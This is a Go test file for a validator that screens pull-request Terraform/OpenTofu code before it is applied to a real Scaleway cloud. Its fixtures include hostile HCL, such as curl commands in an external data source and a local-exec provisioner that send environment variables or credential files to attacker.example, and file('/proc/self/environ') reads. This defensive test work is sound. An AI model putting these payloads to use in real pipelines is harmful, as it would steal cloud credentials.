package cli

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

var gateAllowlist = []string{"scaleway_account_project", "scaleway_block_volume", "scaleway_lb*"}

func writeShapeHCL(t *testing.T, body string) string {
	t.Helper()
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "main.tf"), []byte(body), 0o600); err != nil {
		t.Fatalf("write hcl: %v", err)
	}
	return dir
}

// A realistic minimum: every Layer 3 stack declares its provider source
// and creates its own project.
const shapeProject = `
terraform {
  required_providers {
    scaleway = {
      source  = "scaleway/scaleway"
      version = "2.81.0"
    }
  }
}
resource "scaleway_account_project" "main" { name = "x" }
`

// The bypass that retired the regex. `resource /*x*/ "..."` is valid HCL
// that a `resource\s+"` pattern does not match, and the grammar permits
// comments almost anywhere, so no expression closes the class.
func TestLayer3ShapeCatchesCommentObfuscatedResource(t *testing.T) {
	dir := writeShapeHCL(t, shapeProject+`
resource /*sneaky*/ "scaleway_k8s_cluster" "expensive" {
  name = "nope"
}`)

	err := validateLayer3HCLShape(dir, gateAllowlist)
	if err == nil {
		t.Fatal("comment-obfuscated disallowed resource must be refused")
	}
	if !strings.Contains(err.Error(), "scaleway_k8s_cluster") {
		t.Errorf("error did not name the type: %v", err)
	}
}

// data "external" runs its program at PLAN time, with the cloud credentials
// in the environment. Restricting data sources to the cloud under test
// removes the family rather than naming the dangerous member.
func TestLayer3ShapeRefusesExternalDataSource(t *testing.T) {
	dir := writeShapeHCL(t, shapeProject+`
data "external" "exfil" {
  program = ["sh", "-c", "curl -d @/proc/self/environ https://attacker.example"]
}`)

	if err := validateLayer3HCLShape(dir, gateAllowlist); err == nil {
		t.Fatal("an external data source must be refused")
	}
}

func TestLayer3ShapeRefusesProvisioner(t *testing.T) {
	dir := writeShapeHCL(t, shapeProject+`
resource "scaleway_block_volume" "v" {
  size_in_gb = 1
  provisioner "local-exec" {
    command = "curl -d @$HOME/.config/scw/config.yaml https://attacker.example"
  }
}`)

	err := validateLayer3HCLShape(dir, gateAllowlist)
	if err == nil {
		t.Fatal("a provisioner must be refused")
	}
	if !strings.Contains(err.Error(), "provisioner") {
		t.Errorf("error did not name the construct: %v", err)
	}
}

func TestLayer3ShapeRefusesModule(t *testing.T) {
	dir := writeShapeHCL(t, shapeProject+`module "anything" { source = "./expensive" }`)

	if err := validateLayer3HCLShape(dir, gateAllowlist); err == nil {
		t.Fatal("a module must be refused — it declares resources this check cannot see")
	}
}

func TestLayer3ShapeRefusesForeignProvider(t *testing.T) {
	dir := writeShapeHCL(t, shapeProject+`provider "external" {}`)

	if err := validateLayer3HCLShape(dir, gateAllowlist); err == nil {
		t.Fatal("a non-scaleway provider must be refused")
	}
}

// Unparseable means unknowable, and this path applies to a real cloud.
func TestLayer3ShapeRefusesUnparseableHCL(t *testing.T) {
	dir := writeShapeHCL(t, `resource "scaleway_block_volume" "broken" {`)

	err := validateLayer3HCLShape(dir, gateAllowlist)
	if err == nil {
		t.Fatal("unparseable HCL must be refused rather than applied")
	}
	if !strings.Contains(err.Error(), "cannot parse") {
		t.Errorf("error should say it could not parse: %v", err)
	}
}

// It must accept what Layer 3 actually generates, or it blocks every run.
func TestLayer3ShapeAcceptsRealGeneratedStack(t *testing.T) {
	dir := writeShapeHCL(t, `
terraform {
  required_providers {
    scaleway = { source = "scaleway/scaleway", version = "2.81.0" }
  }
}
provider "scaleway" {}
variable "size" {
  type    = number
  default = 5
}
resource "scaleway_account_project" "main" { name = "run" }
resource "scaleway_block_volume" "data" {
  name       = "d"
  size_in_gb = var.size
  project_id = scaleway_account_project.main.id
}
output "project_id" { value = scaleway_account_project.main.id }`)

	if err := validateLayer3HCLShape(dir, gateAllowlist); err != nil {
		t.Errorf("a legitimate Layer 3 stack was refused: %v", err)
	}
}

// A provider binary is code. `tofu init` downloads and executes it with the
// cloud credentials in the environment, and this path lets a pull request
// choose the registry address.
func TestLayer3ShapeRefusesForeignProviderSource(t *testing.T) {
	dir := writeShapeHCL(t, `
terraform {
  required_providers {
    scaleway = {
      source  = "attacker/scaleway"
      version = "1.0.0"
    }
  }
}
resource "scaleway_account_project" "main" { name = "x" }`)

	err := validateLayer3HCLShape(dir, gateAllowlist)
	if err == nil {
		t.Fatal("a non-canonical provider source must be refused")
	}
	if !strings.Contains(err.Error(), "scaleway/scaleway") {
		t.Errorf("error did not name the required source: %v", err)
	}
}

func TestLayer3ShapeAcceptsCanonicalProviderSource(t *testing.T) {
	dir := writeShapeHCL(t, `
terraform {
  required_providers {
    scaleway = {
      source  = "scaleway/scaleway"
      version = "2.81.0"
    }
  }
}
resource "scaleway_account_project" "main" { name = "x" }`)

	if err := validateLayer3HCLShape(dir, gateAllowlist); err != nil {
		t.Errorf("the canonical provider source was refused: %v", err)
	}
}

// A range is not a pin. The gate fixtures carried `~> 2.57` and resolved
// to 2.81.0 -- the registry chose, not a reviewer -- and the provider is
// an executable that runs with SCW_SECRET_KEY in its environment.
func TestLayer3ShapeRefusesAProviderVersionRange(t *testing.T) {
	dir := writeShapeHCL(t, `
terraform {
  required_providers {
    scaleway = {
      source  = "scaleway/scaleway"
      version = "~> 2.57"
    }
  }
}
resource "scaleway_account_project" "main" { name = "x" }`)

	err := validateLayer3HCLShape(dir, gateAllowlist)

	require.Error(t, err, "a version range lets the registry pick the binary that runs with real credentials")
	assert.Contains(t, err.Error(), "not a pin")
}

// Omitting the version entirely is the same problem with less warning.
func TestLayer3ShapeRefusesAnUnpinnedProvider(t *testing.T) {
	dir := writeShapeHCL(t, `
terraform {
  required_providers {
    scaleway = { source = "scaleway/scaleway" }
  }
}
resource "scaleway_account_project" "main" { name = "x" }`)

	err := validateLayer3HCLShape(dir, gateAllowlist)

	require.Error(t, err)
	assert.Contains(t, err.Error(), "declares no version")
}

// A different exact version is still the PR choosing the binary.
func TestLayer3ShapeRefusesADifferentExactVersion(t *testing.T) {
	dir := writeShapeHCL(t, `
terraform {
  required_providers {
    scaleway = {
      source  = "scaleway/scaleway"
      version = "2.80.0"
    }
  }
}
resource "scaleway_account_project" "main" { name = "x" }`)

	require.Error(t, validateLayer3HCLShape(dir, gateAllowlist))
}

// The endpoint comes from the sealed environment and nowhere else (S139).
// A provider block accepting api_url would let a fixture retarget a "real"
// apply at something that is not the real cloud.
func TestLayer3ShapeRefusesProviderEndpointOverride(t *testing.T) {
	dir := writeShapeHCL(t, `provider "scaleway" { api_url = "https://attacker.example" }`+"\n"+shapeProject)

	err := validateLayer3HCLShape(dir, gateAllowlist)
	if err == nil {
		t.Fatal("a provider api_url override must be refused")
	}
	if !strings.Contains(err.Error(), "api_url") {
		t.Errorf("error did not name the setting: %v", err)
	}
}

// project_id would move resources out of the disposable per-run project
// that bounds blast radius.
func TestLayer3ShapeRefusesProviderProjectOverride(t *testing.T) {
	dir := writeShapeHCL(t, `provider "scaleway" { project_id = "0b6a8a6a-7242-4852-a0cb-ac2e4fc86b92" }`+"\n"+shapeProject)

	if err := validateLayer3HCLShape(dir, gateAllowlist); err == nil {
		t.Fatal("a provider project_id override must be refused")
	}
}

func TestLayer3ShapeAllowsRegionAndZoneOnProvider(t *testing.T) {
	dir := writeShapeHCL(t, `provider "scaleway" {
  region = "fr-par"
  zone   = "fr-par-1"
}`+"\n"+shapeProject)

	if err := validateLayer3HCLShape(dir, gateAllowlist); err != nil {
		t.Errorf("region/zone are placement, not identity, and must be allowed: %v", err)
	}
}

// tofu loads .tf.json exactly as it loads .tf, and this validator parses
// native HCL only — so a JSON file would sail past it.
func TestLayer3ShapeRefusesTfJSON(t *testing.T) {
	dir := writeShapeHCL(t, shapeProject)
	if err := os.WriteFile(filepath.Join(dir, "sneaky.tf.json"),
		[]byte(`{"resource":{"scaleway_k8s_cluster":{"c":{"name":"x"}}}}`), 0o600); err != nil {
		t.Fatalf("write json: %v", err)
	}

	err := validateLayer3HCLShape(dir, gateAllowlist)
	if err == nil {
		t.Fatal(".tf.json must be refused — tofu reads it and this check does not")
	}
	if !strings.Contains(err.Error(), "tf.json") {
		t.Errorf("error did not name the file type: %v", err)
	}
}

// lifecycle carries precondition/postcondition, whose error_message is an
// expression evaluated at plan time and surfaced in tofu's output.
func TestLayer3ShapeRefusesLifecycleBlock(t *testing.T) {
	dir := writeShapeHCL(t, shapeProject+`
resource "scaleway_block_volume" "v" {
  size_in_gb = 1
  lifecycle {
    precondition {
      condition     = false
      error_message = file("/proc/self/environ")
    }
  }
}`)

	if err := validateLayer3HCLShape(dir, gateAllowlist); err == nil {
		t.Fatal("a lifecycle block must be refused on the untrusted path")
	}
}

// Omitting required_providers is not a safe default: tofu resolves
// scaleway_* from the default namespace, which is a choice the
// configuration made implicitly rather than one this check verified.
func TestLayer3ShapeRequiresDeclaredProviderSource(t *testing.T) {
	dir := writeShapeHCL(t, `resource "scaleway_account_project" "main" { name = "x" }
resource "scaleway_block_volume" "v" { size_in_gb = 1 }`)

	err := validateLayer3HCLShape(dir, gateAllowlist)
	if err == nil {
		t.Fatal("HCL with no declared provider source must be refused")
	}
	if !strings.Contains(err.Error(), "resolved implicitly") {
		t.Errorf("error did not explain the omission: %v", err)
	}
}

// tofu init processes backend configuration before any apply. A PR-chosen
// backend would have the secret-bearing job contact it, and would move
// state off the local terraform-live.tfstate that every cleanup and sweep
// decision reads.
func TestLayer3ShapeRefusesBackendBlock(t *testing.T) {
	dir := writeShapeHCL(t, `
terraform {
  required_providers {
    scaleway = { source = "scaleway/scaleway", version = "2.81.0" }
  }
  backend "http" {
    address = "https://attacker.example/state"
  }
}
resource "scaleway_account_project" "main" { name = "x" }`)

	if err := validateLayer3HCLShape(dir, gateAllowlist); err == nil {
		t.Fatal("a backend block must be refused — cleanup reads local state")
	}
}

// A correct source under a name nothing uses leaves `scaleway` itself
// resolving implicitly, which is precisely what the source check exists
// to prevent.
func TestLayer3ShapeRejectsCanonicalSourceUnderWrongLocalName(t *testing.T) {
	dir := writeShapeHCL(t, `
terraform {
  required_providers {
    foo = { source = "scaleway/scaleway", version = "2.81.0" }
  }
}
resource "scaleway_account_project" "main" { name = "x" }`)

	err := validateLayer3HCLShape(dir, gateAllowlist)
	if err == nil {
		t.Fatal("only the scaleway local name may satisfy the requirement")
	}
	if !strings.Contains(err.Error(), "resolved implicitly") {
		t.Errorf("error did not explain the gap: %v", err)
	}
}

// Declaring a scaleway_account_project satisfies the existence check while
// the actual resources are pinned somewhere else entirely — on this account,
// "somewhere else" includes the project holding live infrastructure.
func TestLayer3ShapeRefusesLiteralProjectID(t *testing.T) {
	dir := writeShapeHCL(t, shapeProject+`
resource "scaleway_block_volume" "escapee" {
  size_in_gb = 1
  project_id = "0b6a8a6a-7242-4852-a0cb-ac2e4fc86b92"
}`)

	err := validateLayer3HCLShape(dir, gateAllowlist)
	if err == nil {
		t.Fatal("a literal project_id must be refused — it escapes the disposable project")
	}
	if !strings.Contains(err.Error(), "project_id") {
		t.Errorf("error did not name the attribute: %v", err)
	}
}

func TestLayer3ShapeRefusesProjectIDFromVariable(t *testing.T) {
	dir := writeShapeHCL(t, shapeProject+`
variable "target" {
  type    = string
  default = "0b6a8a6a-7242-4852-a0cb-ac2e4fc86b92"
}
resource "scaleway_block_volume" "escapee" {
  size_in_gb = 1
  project_id = var.target
}`)

	if err := validateLayer3HCLShape(dir, gateAllowlist); err == nil {
		t.Fatal("project_id from a variable must be refused")
	}
}

// The legitimate shape: bound to the stack's own project.
func TestLayer3ShapeAcceptsProjectIDBoundToOwnProject(t *testing.T) {
	dir := writeShapeHCL(t, shapeProject+`
resource "scaleway_block_volume" "data" {
  size_in_gb = 1
  project_id = scaleway_account_project.main.id
}`)

	if err := validateLayer3HCLShape(dir, gateAllowlist); err != nil {
		t.Errorf("a resource bound to its own project was refused: %v", err)
	}
}

// Mentioning the disposable project is not the same as using it.
// Expr.Variables() reports which traversals appear, not what the
// expression evaluates to.
func TestLayer3ShapeRefusesProjectIDExpressionThatOnlyMentionsTheProject(t *testing.T) {
	dir := writeShapeHCL(t, shapeProject+`
resource "scaleway_block_volume" "escapee" {
  size_in_gb = 1
  project_id = scaleway_account_project.main.id != "" ? "0b6a8a6a-7242-4852-a0cb-ac2e4fc86b92" : "0b6a8a6a-7242-4852-a0cb-ac2e4fc86b92"
}`)

	err := validateLayer3HCLShape(dir, gateAllowlist)
	if err == nil {
		t.Fatal("an expression that merely references the project must be refused")
	}
	if !strings.Contains(err.Error(), "direct reference") {
		t.Errorf("error did not explain the requirement: %v", err)
	}
}

// .name is also a reference to the project, but the name is chosen by the
// PR and can be set to any existing project's UUID.
func TestLayer3ShapeRefusesProjectIDFromNonIDAttribute(t *testing.T) {
	dir := writeShapeHCL(t, shapeProject+`
resource "scaleway_block_volume" "escapee" {
  size_in_gb = 1
  project_id = scaleway_account_project.main.name
}`)

	if err := validateLayer3HCLShape(dir, gateAllowlist); err == nil {
		t.Fatal("project_id must be the project's .id, not an attribute the PR chooses")
	}
}

// The generation-path check is a substring scan, which a comment satisfies.
// On the untrusted path the parser decides.
func TestLayer3ShapeRefusesCommentedOutProjectResource(t *testing.T) {
	dir := writeShapeHCL(t, `
terraform {
  required_providers {
    scaleway = { source = "scaleway/scaleway", version = "2.81.0" }
  }
}
# resource "scaleway_account_project" "main" {}
resource "scaleway_block_volume" "orphan" { size_in_gb = 1 }`)

	err := validateLayer3HCLShape(dir, gateAllowlist)
	if err == nil {
		t.Fatal("a commented-out project must not satisfy the containment requirement")
	}
	if !strings.Contains(err.Error(), "disposable project") {
		t.Errorf("error did not explain the requirement: %v", err)
	}
}

// Omitting project_id is not a neutral omission: the provider falls back
// to SCW_DEFAULT_PROJECT_ID, which the sealed environment points at a
// real project the run never created and the sweep never destroys.
func TestLayer3ShapeRefusesResourceWithNoProjectID(t *testing.T) {
	dir := writeShapeHCL(t, shapeProject+`
resource "scaleway_block_volume" "adrift" {
  size_in_gb = 1
}`)

	err := validateLayer3HCLShape(dir, gateAllowlist)

	require.Error(t, err, "a resource with no project_id lands in the fallback project")
	assert.Contains(t, err.Error(), "fallback project")
}

// A child resource inherits containment from its parent, so the parent
// must be a resource this run created.
func TestLayer3ShapeRefusesChildBoundToALiteralParent(t *testing.T) {
	dir := writeShapeHCL(t, shapeProject+`
resource "scaleway_lb_backend" "hijack" {
  lb_id            = "fr-par-1/11111111-2222-3333-4444-555555555555"
  forward_protocol = "http"
  forward_port     = 80
}`)

	err := validateLayer3HCLShape(dir, gateAllowlist)

	require.Error(t, err, "a literal lb_id attaches a backend to someone else's load balancer")
	assert.Contains(t, err.Error(), "does not own")
}

// ...and the ordinary shape must still be accepted, or the gate cannot
// run the very stack it exists to run.
func TestLayer3ShapeAcceptsChildBoundToAnInStackParent(t *testing.T) {
	dir := writeShapeHCL(t, shapeProject+`
resource "scaleway_lb_ip" "front" {
  project_id = scaleway_account_project.main.id
}
resource "scaleway_lb" "main" {
  ip_ids     = [scaleway_lb_ip.front.id]
  type       = "LB-S"
  project_id = scaleway_account_project.main.id
}
resource "scaleway_lb_backend" "web" {
  lb_id            = scaleway_lb.main.id
  forward_protocol = "http"
  forward_port     = 80
}`)

	assert.NoError(t, validateLayer3HCLShape(dir, gateAllowlist))
}

// The project resource is the project; requiring it to bind to itself
// would make every valid stack unrepresentable.
func TestLayer3ShapeExemptsTheProjectResourceItself(t *testing.T) {
	dir := writeShapeHCL(t, shapeProject)

	assert.NoError(t, validateLayer3HCLShape(dir, gateAllowlist))
}

// The checker and the fixtures the gate actually applies must agree. A
// containment rule that rejects the committed stack is a broken gate, and
// it would only be discovered by a real run costing real money.
func TestRealGateFixturesPassTheirOwnPreflight(t *testing.T) {
	// Read the allowlist the workflow actually writes, rather than
	// restating it here. A hardcoded copy passes while the gate fails --
	// which is exactly what happened: this test widened its own list for
	// the lb-serving-paris fixture and the workflow kept the narrow one,
	// so the scenario would have been refused before applying anything.
	allow := gateWorkflowAllowlist(t)
	for _, scenario := range []string{"block-paris", "lb-serving-paris"} {
		t.Run(scenario, func(t *testing.T) {
			dir := filepath.Join("..", "..", "examples", "layer3-gate", scenario)
			assert.NoError(t, layer3PreflightHCL(dir, allow))
		})
	}
}

// The trusted lock file is the control the version pin cannot be: a
// version string names a release, a lock file names the bytes. The
// workflow copies these from the base checkout, so they must exist for
// every gate fixture or the gate would fall back to trusting the PR.
func TestEveryGateFixtureHasATrustedLockFile(t *testing.T) {
	fixtures, err := filepath.Glob(filepath.Join("..", "..", "examples", "layer3-gate", "*"))
	require.NoError(t, err)
	require.NotEmpty(t, fixtures)

	for _, dir := range fixtures {
		info, statErr := os.Stat(dir)
		if statErr != nil || !info.IsDir() {
			continue
		}
		t.Run(filepath.Base(dir), func(t *testing.T) {
			lock, readErr := os.ReadFile(filepath.Join(dir, ".terraform.lock.hcl"))
			require.NoError(t, readErr, "no trusted .terraform.lock.hcl; the PR would choose the provider binary")

			assert.Contains(t, string(lock), layer3ScalewayProviderVersion,
				"the lock file must pin the same version the shape check enforces")
			assert.Contains(t, string(lock), "h1:",
				"the lock file must carry hashes, not just a version")
		})
	}
}

// The prompt and the checker must agree on the provider pin.
//
// validateLayer3HCLShape runs on generated HCL as well as on the gate's
// PR-supplied HCL, so a constant bumped here without the prompt would
// make every generated Layer 3 stack fail its own preflight -- after the
// LLM call, on every iteration, with the repair loop unable to fix it
// because the prompt still says the old version.
func TestScalewayPromptPinsTheProviderVersionTheCheckerRequires(t *testing.T) {
	t.Parallel()

	prompt, err := os.ReadFile(filepath.Join("..", "..", "prompts", "scaleway", "phase2_generate_hcl.md"))
	require.NoError(t, err)

	assert.Contains(t, string(prompt), `version = "`+layer3ScalewayProviderVersion+`"`,
		"prompts/scaleway/phase2_generate_hcl.md must tell the model to emit the version layer3ScalewayProviderVersion requires")
}

// gateWorkflowAllowlist extracts allow_resource_types from the config
// heredoc in .github/workflows/layer3-gate.yml.
//
// The workflow writes its config with `cat > ... <<CFG`, so the list is
// YAML nested inside a shell script inside YAML. Pulling it out is ugly;
// trusting a second copy of it is worse.
func gateWorkflowAllowlist(t *testing.T) []string {
	t.Helper()

	raw, err := os.ReadFile(filepath.Join("..", "..", ".github", "workflows", "layer3-gate.yml"))
	require.NoError(t, err)

	lines := strings.Split(string(raw), "\n")
	var allow []string
	collecting := false
	for _, line := range lines {
		trimmed := strings.TrimSpace(line)
		if strings.HasPrefix(trimmed, "allow_resource_types:") {
			collecting = true
			continue
		}
		if !collecting {
			continue
		}
		// Comments and blank lines sit inside the list; only a
		// non-comment, non-item line ends it.
		if trimmed == "" || strings.HasPrefix(trimmed, "#") {
			continue
		}
		if !strings.HasPrefix(trimmed, "- ") {
			break
		}
		allow = append(allow, strings.TrimSpace(strings.TrimPrefix(trimmed, "- ")))
	}

	require.NotEmpty(t, allow, "could not read allow_resource_types out of the gate workflow")
	return allow
}

// The exfiltration path that provisioner and data-source blocking did
// not close: an ordinary attribute reading the runner's environment and
// handing it to a machine whose boot script the PR controls.
func TestLayer3ShapeRefusesFileFunctionInUserData(t *testing.T) {
	dir := writeShapeHCL(t, shapeProject+`
resource "scaleway_instance_server" "web" {
  type       = "DEV1-S"
  image      = "ubuntu_jammy"
  project_id = scaleway_account_project.main.id
  user_data  = { cloud-init = file("/proc/self/environ") }
}`)

	err := validateLayer3HCLShape(dir, append(gateAllowlist, "scaleway_instance_server"))

	require.Error(t, err, "file() can read SCW_SECRET_KEY out of the runner environment")
	assert.Contains(t, err.Error(), "file()")
}

// The gate posts its output to the pull request, so an output is the
// shortest path of all.
func TestLayer3ShapeRefusesFunctionCallInOutput(t *testing.T) {
	dir := writeShapeHCL(t, shapeProject+`
output "leak" {
  value = file("/proc/self/environ")
}`)

	require.Error(t, validateLayer3HCLShape(dir, gateAllowlist))
}

// Nested inside a collection, which a shallow check would miss.
func TestLayer3ShapeRefusesFunctionCallNestedInACollection(t *testing.T) {
	dir := writeShapeHCL(t, shapeProject+`
locals {
  sneaky = { a = [1, templatefile("x.tpl", {})] }
}`)

	require.Error(t, validateLayer3HCLShape(dir, gateAllowlist))
}

// `type = list(string)` parses as a call and is not one. block-paris
// declares exactly this, so getting it wrong would refuse a committed
// fixture.
func TestLayer3ShapeAllowsTypeConstraintsThatLookLikeCalls(t *testing.T) {
	dir := writeShapeHCL(t, shapeProject+`
variable "zones" {
  type    = list(string)
  default = ["fr-par-1"]
}`)

	assert.NoError(t, validateLayer3HCLShape(dir, gateAllowlist))
}

// A data source reads the real account, outside the run's disposable
// project, and the value can be interpolated into an allowed resource --
// the same exfiltration as file(), reached by a traversal rather than a
// call, so refusing function calls does not cover it.
func TestLayer3ShapeRefusesDataSources(t *testing.T) {
	dir := writeShapeHCL(t, shapeProject+`
data "scaleway_account_project" "someone_elses" {
  name = "openclaw"
}`)

	err := validateLayer3HCLShape(dir, gateAllowlist)

	require.Error(t, err, "data blocks read the real account outside the run's project")
	assert.Contains(t, err.Error(), "not permitted")
}

// Fifty real servers, billing hourly, from one allowed resource type.
func TestLayer3ShapeRefusesCountOnAResource(t *testing.T) {
	dir := writeShapeHCL(t, shapeProject+`
resource "scaleway_block_volume" "many" {
  count      = 50
  size_in_gb = 1
  project_id = scaleway_account_project.main.id
}`)

	err := validateLayer3HCLShape(dir, gateAllowlist)

	require.Error(t, err)
	assert.Contains(t, err.Error(), "count")
}

// The quieter direction: count = 0 applies nothing, sweeps clean, and
// reports green -- a false green, which is the failure the gate exists
// to eliminate.
func TestLayer3ShapeRefusesCountZero(t *testing.T) {
	dir := writeShapeHCL(t, shapeProject+`
resource "scaleway_block_volume" "vanished" {
  count      = 0
  size_in_gb = 1
  project_id = scaleway_account_project.main.id
}`)

	require.Error(t, validateLayer3HCLShape(dir, gateAllowlist))
}

func TestLayer3ShapeRefusesForEachOnAResource(t *testing.T) {
	dir := writeShapeHCL(t, shapeProject+`
resource "scaleway_block_volume" "spread" {
  for_each   = { a = 1, b = 2 }
  size_in_gb = 1
  project_id = scaleway_account_project.main.id
}`)

	require.Error(t, validateLayer3HCLShape(dir, gateAllowlist))
}

// OpenTofu loads .tofu and .tofu.json as configuration. A .tofu file
// beside valid .tf would be applied with cloud credentials having passed
// none of the checks in this file.
func TestLayer3ShapeRefusesEveryConfigExtensionItCannotRead(t *testing.T) {
	for _, name := range []string{
		"extra.tf.json", "extra.tofu", "extra.tofu.json",
		// Not configuration but auto-loaded all the same: these set
		// variable VALUES, so the .tf can validate and the apply can
		// still be priced by something nobody checked.
		"terraform.tfvars", "terraform.tfvars.json",
		"sizes.auto.tfvars", "sizes.auto.tfvars.json",
	} {
		t.Run(name, func(t *testing.T) {
			dir := writeShapeHCL(t, shapeProject)
			require.NoError(t, os.WriteFile(filepath.Join(dir, name), []byte(`{"resource":{}}`), 0o600))

			err := validateLayer3HCLShape(dir, gateAllowlist)

			require.Error(t, err, "%s is loaded by tofu but not parsed here", name)
			assert.Contains(t, err.Error(), name)
		})
	}
}

// ...and the lock file the workflow stages must not be mistaken for one.
func TestLayer3ShapeAcceptsTheTrustedLockFile(t *testing.T) {
	dir := writeShapeHCL(t, shapeProject)
	require.NoError(t, os.WriteFile(filepath.Join(dir, ".terraform.lock.hcl"), []byte(`provider "x" {}`), 0o600))

	assert.NoError(t, validateLayer3HCLShape(dir, gateAllowlist))
}

// The teardown model assumes one disposable project throughout:
// CaptureSweepTarget records one id, AssertProjectDeletable guards that
// one, the sweep asks about that one. A second project would take half
// the stack somewhere nothing is looking.
func TestLayer3ShapeRefusesASecondProject(t *testing.T) {
	dir := writeShapeHCL(t, shapeProject+`
resource "scaleway_account_project" "shadow" { name = "y" }
resource "scaleway_block_volume" "hidden" {
  size_in_gb = 1
  project_id = scaleway_account_project.shadow.id
}`)

	err := validateLayer3HCLShape(dir, gateAllowlist)

	require.Error(t, err, "two projects means the sweep verifies only one of them")
	assert.Contains(t, err.Error(), "exactly one")
}
